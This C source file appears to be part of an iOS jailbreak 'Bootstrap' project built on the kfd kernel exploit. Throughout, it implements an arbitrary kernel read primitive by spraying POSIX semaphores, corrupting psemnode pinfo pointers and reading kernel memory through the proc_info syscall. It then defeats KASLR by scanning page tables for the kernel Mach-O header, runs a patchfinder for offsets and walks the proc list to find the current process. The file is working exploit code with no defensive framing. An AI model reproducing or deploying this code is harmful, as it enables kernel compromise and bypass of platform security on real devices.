//
//  kread_sem_open.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "kread_sem_open.h"


// #define ADDRISVALID(val) ((val) >= 0xffff000000000000 && (val) != 0xffffffffffffffff)

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > pac_mask) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    u64 pseminfo_kaddr = static_uget(psemnode, pinfo, kfd->kread.krkw_object_uaddr);
    u64 semaphore_kaddr = static_kget(pseminfo, u64, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(semaphore, u64, owner, semaphore_kaddr);
    
    if(!running_IO) { // for ios 16+, need to use patchfinder to find these offsets
        //Step 1. break kaslr
        printf("kernel_task: 0x%llx\n", task_kaddr);
        
        uint64_t kerntask_vm_map = 0;
        kread((uint64_t)kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
        kerntask_vm_map = kerntask_vm_map | 0xffffff8000000000;
        printf("kernel_task->vm_map: 0x%llx\n", kerntask_vm_map);
        
        uint64_t kerntask_pmap = 0;
        kread((uint64_t)kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
        kerntask_pmap = kerntask_pmap | 0xffffff8000000000;
        printf("kernel_task->vm_map->pmap: 0x%llx\n", kerntask_pmap);
        
        // Pointer to the root translation table. */ /* translation table entry
        uint64_t kerntask_tte = 0;
        kread((uint64_t)kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
        kerntask_tte = kerntask_tte | 0xffffff8000000000;
        printf("kernel_task->vm_map->pmap->tte: 0x%llx\n", kerntask_tte);
        
        uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
        printf("kerntask_tte_page: 0x%llx\n", kerntask_tte_page);
        
        uint64_t kbase = 0;
        while (true) {
            uint64_t val = 0;
            kread((uint64_t)kfd, kerntask_tte_page, &val, sizeof(val));
            if(val == 0x100000cfeedfacf) {
                kread((uint64_t)kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); //check if mach_header_64->flags, mach_header_64->reserved are all 0
                if(val == 0) {
                    kbase = kerntask_tte_page;
                    break;
                }
            }
            kerntask_tte_page -= 0x1000;
        }
        printf("defeated kaslr, kbase: 0x%llx, kslide: 0x%llx\n", kbase, kbase - 0xFFFFFFF007004000);
        
        int pf = do_patchfinder((uint64_t)kfd, kbase);
        if(pf != 0) {
            printf("error! Patchfinder failed!\n");
            return;
        }
        
        kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
        //assert(ADDRISVALID( kern_versions[kfd->info.env.vid].kernelcache__cdevsw));
        kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__gPhysBase));
        kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__gPhysSize));
        kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__gVirtBase));
        kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open));
        kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices));
        kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__ptov_table));
        kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter));
        kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
        //assert(ADDRISVALID(kern_versions[kfd->info.env.vid].proc__object_size));
    }
    
    u64 proc_kaddr = task_kaddr - dynamic_sizeof(proc);
    kfd->info.kernel.kernel_proc = proc_kaddr;

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    while (true) {
        i32 pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kernel.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];
    u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    u64 new_pinfo = kaddr - static_offsetof(pseminfo, psem_uid);
    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];
    u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    u64 new_pinfo = kaddr - static_offsetof(pseminfo, psem_usecount);
    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}
